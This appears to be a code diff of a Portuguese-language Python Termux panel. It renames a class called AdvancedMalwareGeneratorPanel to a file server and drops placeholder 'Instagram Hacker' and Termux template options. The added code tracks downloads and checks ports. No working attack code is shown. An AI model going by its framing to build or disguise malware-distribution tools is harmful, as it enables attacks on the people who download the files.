+        new_description = Prompt.ask(
+            "[yellow]?[/yellow] Nova descrição", 
+            default=self.site_config['description']
+        )
+        
+        self.site_config['title'] = new_title
+        self.site_config['description'] = new_description
+        
+        console.print("[green]✅ Configurações atualizadas![/green]")
+        input("\nPressione Enter para voltar...")
+    
+    def show_statistics(self):
+        """Mostra estatísticas detalhadas"""
+        console.print(Panel.fit(
+            "[bold]📈 ESTATÍSTICAS DETALHADAS[/bold]",
+            border_style="blue"
+        ))
+        
+        files = self.file_manager.list_uploaded_files()
+        total_downloads = sum(file_info['download_count'] for file_info in files.values())
+        total_size = sum(file_info['file_size'] for file_info in files.values())
+        
+        stats_table = Table(show_header=True, header_style="bold magenta")
+        stats_table.add_column("Métrica", style="cyan")
+        stats_table.add_column("Valor", style="green")
+        
+        stats_table.add_row("Total de Arquivos", str(len(files)))
+        stats_table.add_row("Total de Downloads", str(total_downloads))
+        stats_table.add_row("Espaço Total", f"{total_size / 1024 / 1024:.2f} MB")
+        stats_table.add_row("Servidor Ativo", "Sim" if self.server else "Não")
+        
+        console.print(stats_table)
+        
+        if files:
+            console.print("\n[bold]📊 Downloads por Arquivo:[/bold]")
+            for file_id, file_info in files.items():
+                console.print(f"  {file_info['file_name']}: {file_info['download_count']} downloads")
         
         input("\nPressione Enter para voltar...")
     
-    def configure_termux_template(self):
-        """Configura template do Termux"""
-        console.print(Panel.fit(
-            "[bold]📝 CONFIGURAR TEMPLATE TERMUX[/bold]",
-            border_style="blue"
-        ))
-        
-        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
+    def check_port_available(self, port):
+        """Verifica se a porta está disponível"""
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.bind(('0.0.0.0', port))
+                return True
+        except:
+            return False
     
-    def configure_instahacker_template(self):
-        """Configura template do Instagram Hacker"""
-        console.print(Panel.fit(
-            "[bold]📝 CONFIGURAR TEMPLATE INSTAGRAM HACKER[/bold]",
-            border_style="blue"
-        ))
-        
-        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
-    
-    def configure_ports(self):
-        """Configura portas padrão"""
-        console.print(Panel.fit(
-            "[bold]🔌 CONFIGURAR PORTAS PADRÃO[/bold]",
-            border_style="blue"
-        ))
-        
-        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
-    
-    def configure_autostart(self):
-        """Configura auto-inicialização"""
-        console.print(Panel.fit(
-            "[bold]🔧 CONFIGURAR AUTO-INICIALIZAÇÃO[/bold]",
-            border_style="blue"
-        ))
-        
-        console.print("[yellow]⚠️ Funcionalidade em desenvolvimento...[/yellow]")
+    def get_local_ip(self):
+        """Obtém IP local"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
     
     def stop_web_server(self):
         """Para o servidor web"""
         if self.server:
             self.server.shutdown()
+            self.server.server_close()
             self.server = None
             console.print("[green]✅ Servidor parado[/green]")
     
     def exit_program(self):
         """Sai do programa"""
         console.print(Panel.fit(
-            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
+            "[blink bold red]⚠️ AVISO LEGAL: USE COM RESPONSABILIDADE! ⚠️[/blink bold red]",
             border_style="red"
         ))
         self.stop_web_server()
@@ -1510,13 +1210,19 @@ class AdvancedMalwareGeneratorPanel:
 
 def main():
     try:
-        panel = AdvancedMalwareGeneratorPanel()
+        # Verificar se está no Termux
+        if not os.path.exists('/data/data/com.termux/files/usr'):
+            console.print("[yellow]⚠️ Script otimizado para Termux[/yellow]")
+        
+        panel = AdvancedFileServerPanel()
         panel.show_menu()
     except KeyboardInterrupt:
         console.print("\n[red]✗ Cancelado pelo usuário[/red]")
         sys.exit(0)
     except Exception as e:
         console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
+        import traceback
+        traceback.print_exc()
         sys.exit(1)
 
 if __name__ == '__main__':
